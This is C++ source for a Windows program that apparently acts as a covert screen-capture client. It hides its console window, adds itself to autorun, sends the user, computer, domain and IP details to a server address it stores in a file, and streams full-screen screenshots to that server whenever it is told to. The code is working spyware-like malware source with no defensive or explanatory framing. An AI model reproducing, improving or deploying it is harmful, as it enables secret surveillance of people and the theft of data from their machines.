#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <windows.h>
#include <thread>
#include <chrono>
#include <gdiplus.h>

#include "autorun.h"

#define PORT 1069
#define IP_LEN 16
#define CODE_SCREEN 0x01

struct clientData {
    char ip[IP_LEN + 1];
    wchar_t domain[256];
    wchar_t userName[256];
    wchar_t compName[MAX_COMPUTERNAME_LENGTH + 1];
};

struct screenData {
    unsigned long size;
    long width;
    long height;
    byte *data;
};


screenData* screenShot() {
    screenData* dataScr = new screenData;

    HDC hScreen = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreen);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    HBITMAP hOldBmp = (HBITMAP) SelectObject(hMemoryDC, hBmp);

    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);

    BITMAP bmp;
    GetObjectA(hBmp, sizeof(bmp), &bmp);

    dataScr->width = bmp.bmWidth;
    dataScr->height = bmp.bmHeight;
    dataScr->size = bmp.bmWidthBytes * bmp.bmHeight;

    dataScr->data = new byte[dataScr->size];
    GetBitmapBits(hBmp, (long)dataScr->size, dataScr->data);


    SelectObject(hMemoryDC, hOldBmp);
    DeleteObject(hBmp);
    DeleteDC(hMemoryDC);

    return dataScr;
}

char *getIP() {
    char *hostname = new char[1024];
    if (gethostname(hostname, 1024)) {
        delete[] hostname;
        return nullptr;
    }

    hostent *host = gethostbyname(hostname);
    if (host == nullptr || host->h_addr_list[0] == nullptr) {
        delete[] hostname;
        return nullptr;
    }

    in_addr addr;
    memcpy(&addr, host->h_addr_list[0], sizeof(addr));

    delete[] hostname;
    return inet_ntoa(addr);
}

clientData setClientData() {
    clientData client;
    memset(&client, 0, sizeof(client));
    DWORD size;

    size = sizeof(client.userName);
    if (!GetUserNameW(client.userName, &size)) {
        return client;
    }

    size = sizeof(client.compName);
    if (!GetComputerNameW(client.compName, &size)) {
        return client;
    }

    size = sizeof(client.domain);
    if (!GetComputerNameExW(ComputerNameDnsDomain, client.domain, &size)) {
        return client;
    }

    char* ip = getIP();
    if (ip != nullptr ){
        strcpy(client.ip, ip);
    }

    return client;
}


int main(int argc, char *argv[]) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    char ipServ[IP_LEN + 1] = {0};

    if (argc == 2){
        std::ofstream file("sup.txt");
        file.write(argv[1], strlen(argv[1]) + 1);
        file.close();

        wchar_t *wargv = new wchar_t[strlen(argv[1]) + 1] {0};
        mbstowcs(wargv, argv[0], strlen(argv[0]) + 1);
        if (!ItselfSetAutorun(wargv)){
            std::cout << "fail set autorun" << std::endl;
        }
    } else {
        std::ifstream file("sup.txt");
        if (!file.is_open()){
            std::cout << "fail open file for read ip" << std::endl;
            return 1;
        }
        char c;
        for (int i = 0; file.get(c); ++i){
            ipServ[i] = c;
        }
        file.close();
    }



    while (true) {
        clientData client;

        const int sizeBuf = 1024;
        char buffer[sizeBuf];

        int bytesRead;
        int bytesSent;

        WSAData wsaData = {0};
        sockaddr_in serverAd;

        WSAStartup(MAKEWORD(2, 2), &wsaData);

        client = setClientData();

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            goto error;
        }

        serverAd.sin_family = AF_INET;
        serverAd.sin_port = htons(PORT);
        serverAd.sin_addr.s_addr = inet_addr(ipServ);

        // Установка соединения с сервером
        while (connect(sock, (sockaddr *) &serverAd, sizeof(serverAd)) == SOCKET_ERROR) {
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(50));


        for (int i = 0; send(sock, (const char *) &client, sizeof(clientData), 0) == SOCKET_ERROR; ++i) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));

            if (i >= 10) {
                closesocket(sock);
                goto error;
            }
        }

        while (true) {
            memset(buffer, 0, sizeBuf);
            bytesRead = recv(sock, buffer, sizeBuf, 0);

            if (bytesRead == SOCKET_ERROR) {
                goto error;

            } else if (bytesRead == 0) {
                closesocket(sock);
                goto error;

            } else if (!strcmp(buffer, "screen")) {
                screenData *screen = screenShot();

                char codeScr[1] = {CODE_SCREEN};

                bytesSent = send(sock, codeScr, 1, 0);
                if (bytesSent == SOCKET_ERROR) {
                    delete[] screen->data;
                    delete screen;
                    continue;
                }

                bytesSent = send(sock, (char *) screen, sizeof(screenData), 0);
                if (bytesSent == SOCKET_ERROR) {
                    delete[] screen->data;
                    delete screen;
                    continue;
                }

                bytesSent = send(sock, (char*)screen->data, (int)screen->size, 0);
                if (bytesSent == SOCKET_ERROR) {
                    delete[] screen->data;
                    delete screen;
                    continue;
                }

                delete[] screen->data;
                delete screen;
            }
        }

error:
        WSACleanup();

        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }

    return 0;
}
